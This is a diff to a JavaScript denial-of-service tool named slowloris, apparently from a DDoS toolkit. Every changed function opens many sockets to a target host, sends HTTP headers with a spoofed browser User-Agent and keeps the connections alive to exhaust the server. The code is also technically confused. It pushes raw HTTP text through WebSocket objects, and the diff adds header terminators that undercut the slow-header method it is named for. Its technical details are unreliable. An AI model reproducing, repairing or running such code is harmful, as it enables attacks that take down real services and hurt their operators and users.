@@ -1,4 +1,3 @@
-// public/main/ddos/slowloris.js
 function slowloris(target, numSockets) {
     if (!target) {
         console.error("Target URL is required.");
@@ -31,8 +30,8 @@ function slowloris(target, numSockets) {
         function createSocket(hostname, port, index, isSecure, path) {
             let socket;
             try {
-                const protocol = isSecure ? 'wss://' : 'ws://';
-                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`);
+                const protocol = isSecure ? 'https:' : 'http:';
+                socket = new WebSocket(`${protocol}//${hostname}:${port}${path}`);
 
                 socket.onopen = () => {
                     socketsOpen++;
@@ -69,7 +68,7 @@ function slowloris(target, numSockets) {
         }
 
         function sendInitialHeader(socket, hostname) {
-            const initialHeader = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n`;
+            const initialHeader = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
             try {
                 socket.send(initialHeader);
                 packetsSent++;
@@ -88,7 +87,7 @@ function slowloris(target, numSockets) {
         }
 
         function sendKeepAliveHeader(socket) {
-            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
+            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
             try {
                 socket.send(keepAliveHeader);
                 packetsSent++;
